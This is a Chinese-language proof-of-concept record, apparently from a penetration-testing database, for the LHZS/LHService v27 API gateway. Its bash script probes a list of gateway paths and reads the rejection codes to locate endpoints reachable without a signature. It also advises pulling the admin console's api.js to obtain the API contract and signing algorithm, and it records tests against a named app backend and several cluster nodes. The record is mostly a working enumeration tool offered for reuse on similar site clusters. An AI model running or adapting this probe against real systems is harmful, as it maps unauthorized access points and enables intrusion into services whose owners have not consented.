# LHZS/LHService v27 网关免签名面定位 + 两层签名校验拒绝码判据

- **code**: lhzs-lhservice-v27-网关免签名面定位-两层签名校验拒绝码判据
- **kind**: poc
- **category**: unauthorized
- **component**: LHZS/LHService v27 API 网关（nginx 前置 + 双层签名校验，ECDSA P-256）
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-11 在 example/6hzs6 App 后端靶标实测（asset 3 = 203.0.113.55，另在 203.0.113.13/64 与 203.0.113.56-62 同集群节点交叉验证同类响应）：/LHService/v27/routing/health、/Tk_Kj/v27/routing/health、/IMService/v27/routing/health 三个前缀**免签名 200**，返回 {"service":"routing-v27","securityVersion":2,"status":"ok"}（59B）；同命名空间 13 个其它路径与裸 /v27/health 全部 403 REQUEST_REJECTED；业务路径统一 400 INVALID_INPUT；非白名单前缀 nginx 404（146B）。管理面（/IMService/admin/、/IMService/v27/admin|auth/admin/*）未认证一律 403 REQUEST_REJECTED —— 已按前端 api.js 原文复现 ECDSA P-256 签名重打，仍 403（说明该层要求已注册设备会话，与签名无关），此负向结论已如实记录。库内 vuln_id=6 + http_evidence id=5 + chain seq 12。
- **path**: pocs/lhzs-lhservice-v27-网关免签名面定位-两层签名校验拒绝码判据/lhzs_v27_gateway_probe.sh
- **tags**: LHZS,网关,免签名,未授权,签名校验,拒绝码判据,routing-health,v27
- **created_at**: 2026-10-11T07:20:34.091Z

## 描述

LHZS v27 网关免签名接口定位与两层签名校验拒绝码判据（400=业务需签名 / 403=管理面 / 404=不在白名单）。核心价值是"用拒绝码反推路径类别"，以及对 routing/health 免签名面的定位方法；跨同类站群可复用。

## 用法

```
GW=203.0.113.55 bash lhzs_v27_gateway_probe.sh
# 免签名命中即为未授权面；404(nginx 146B)=前缀不在白名单；403=管理面
# 管理台静态资源通常整目录可读：curl.exe --noproxy '*' -sk https://$GW/IMService/admin/api.js
# 本机必须显式禁代理（curl.exe --noproxy '*'），Python 侧 ProxyHandler({})
```

## 正文

```
#!/usr/bin/env bash
# LHZS v27 网关：免签名接口定位 + 两层校验判据（改 GW 即可复用）
# 判据（本 POC 最值钱的部分）：
#   200                      -> 免签名放行（未授权面，重点目标）
#   400 INVALID_INPUT        -> 业务路径存在，但需要签名（签名校验层）
#   403 REQUEST_REJECTED     -> 管理面 / 未注册设备（前置拒绝层）
#   404 (nginx 146B)         -> 不在网关路由白名单（前缀不匹配）
#   404 (Tomcat/Spring)      -> 网关转发了，但后端无此资源
set -u
GW="${GW:-203.0.113.55}"
PATHS=(
  "/LHService/v27/routing/health" "/LHService/v27/routing/status" "/LHService/v27/routing/config"
  "/LHService/v27/routing/nodes" "/LHService/v27/routing/metrics" "/LHService/v27/routing/snapshot"
  "/Tk_Kj/v27/routing/health" "/IMService/v27/routing/health"
  "/LHService/v27/health" "/Tk_Kj/v27/health" "/IMService/v27/health"
  "/LHService/v27/public/query" "/Tk_Kj/v27/public/query" "/IMService/v27/chat/query"
  "/LHService/v27/auth/guest/start" "/LHService/v27/auth/register/start"
  "/LHService/v27/anti/postZdata" "/LHService/v27/anti/updateZdata"
  "/IMService/admin/" "/IMService/v27/admin/query" "/IMService/v27/admin/command"
  "/api/v1/mix/upload" "/api/v1/raw/upload" "/download/AutoUpdate" "/lhzs_download/temp.jpg"
)
echo "=== LHZS v27 网关免签名/两层校验判定 (GW=$GW) ==="
for P in "${PATHS[@]}"; do
  OUT=$(curl.exe --noproxy '*' -sk -m 10 -o - -w '|%{http_code}|%{size_download}' \
        -H 'X-Security-Version: 2' "https://$GW$P" 2>/dev/null)
  CODE=$(printf '%s' "$OUT" | sed -n 's/.*|\([0-9]\{3\}\)|.*/\1/p')
  BODY=$(printf '%s' "$OUT" | sed 's/|[0-9]\{3\}|[0-9]*$//')
  MARK=""
  case "$CODE" in
    200) MARK="  <<<< 免签名放行（未授权面）" ;;
    400) MARK="  (业务路径，需签名)" ;;
    403) MARK="  (管理面/未注册设备前置拒绝)" ;;
    404) MARK="  (不在网关路由白名单)" ;;
  esac
  printf '%-42s %s %s%s\n' "$P" "$CODE" "${BODY:0:80}" "$MARK"
done

# 管理后台静态资源（通常整目录未认证可读，直接拿 API 契约与签名算法）
# curl.exe --noproxy '*' -sk https://$GW/IMService/admin/api.js
# 注意：/IMService/ 会 302 到 /IMService/admin/，说明后台路径是约定固定的
curl.exe --noproxy '*' -sk -m 10 -D - -o /dev/null "https://$GW/IMService/" | grep -i location

```
